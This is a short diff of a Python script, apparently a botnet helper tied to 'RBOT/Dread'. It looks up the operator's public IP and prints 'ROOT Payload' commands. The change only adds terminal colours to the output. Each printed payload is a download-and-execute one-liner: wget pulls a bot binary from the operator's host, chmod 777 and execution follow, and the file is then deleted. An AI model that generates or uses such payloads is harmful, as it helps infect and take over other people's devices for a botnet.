@@ -7,11 +7,11 @@ ipaddr = urllib.request.urlopen('http://api.ipify.org').read().decode("utf-8")
 
 def makepayload():
 	os.system("clear")
-	print(f"Your ROOT Payload: wget http://"+ipaddr+"/"+binFolder+"/"+binName+"; chmod 777 *; ./"+binName+"; rm -rf "+binName+"\n")
+	print(f"\033[1;92mYour ROOT Payload\033[37m: \033[1;91mwget http://"+ipaddr+"/"+binFolder+"/"+binName+"; chmod 777 *; ./"+binName+"; rm -rf "+binName+"\n")
 
 def dread():
 	os.system("clear")
-	print(f"Your ROOT Payload: wget http://"+ipaddr+"/botpilled/rbot; chmod 777 *; ./rbot; rm -rf rbot\n")
+	print(f"\033[1;92mYour ROOT Payload\033[37m: \033[1;91mwget http://"+ipaddr+"/botpilled/rbot; chmod 777 *; ./rbot; rm -rf rbot\n")
 
 source = input("Are you using RBOT/Dread? y/n: ")
 if source == "y":
